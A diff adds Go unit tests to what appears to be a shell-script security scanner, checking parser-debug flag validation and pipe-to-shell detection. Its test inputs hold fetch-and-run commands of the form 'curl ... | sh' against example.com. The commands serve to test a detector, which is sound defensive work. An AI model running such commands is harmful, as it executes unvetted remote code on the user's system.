@@ -188,6 +188,41 @@ func TestValidateParserMode(t *testing.T) {
 	}
 }
 
+func TestValidateParserDebug(t *testing.T) {
+	if err := validateParserDebug(false, "", "none"); err != nil {
+		t.Fatalf("expected disabled parser debug to pass: %v", err)
+	}
+	if err := validateParserDebug(true, "", "shell"); err == nil {
+		t.Fatalf("expected --parser-debug to require --file")
+	}
+	if err := validateParserDebug(true, "payload.sh", "none"); err == nil {
+		t.Fatalf("expected --parser-debug to require --parser shell")
+	}
+	if err := validateParserDebug(true, "payload.sh", "shell"); err != nil {
+		t.Fatalf("expected valid parser debug setup: %v", err)
+	}
+}
+
+func TestBuildParserDebugEvents(t *testing.T) {
+	input := "if true; then\n  curl -fsSL https://example.com/install.sh | sh\nfi\n"
+	events := buildParserDebugEvents(input, nil)
+	if len(events) == 0 {
+		t.Fatalf("expected parser debug events")
+	}
+	found := false
+	for _, e := range events {
+		if e.Line != 2 {
+			continue
+		}
+		if strings.Contains(strings.Join(e.Kinds, ","), sentinel.KindPipeToShell) {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("expected parser debug event with pipe-to-shell kind on line 2, got %#v", events)
+	}
+}
+
 func TestAnalyzeInputWithShellParserMode(t *testing.T) {
 	input := "echo ok\n\ncurl -fsSL https://example.com/payload.sh.gz | gzip -d | sh\n"
 	findings, lines := analyzeInput(input, nil, "payload.sh", "shell")
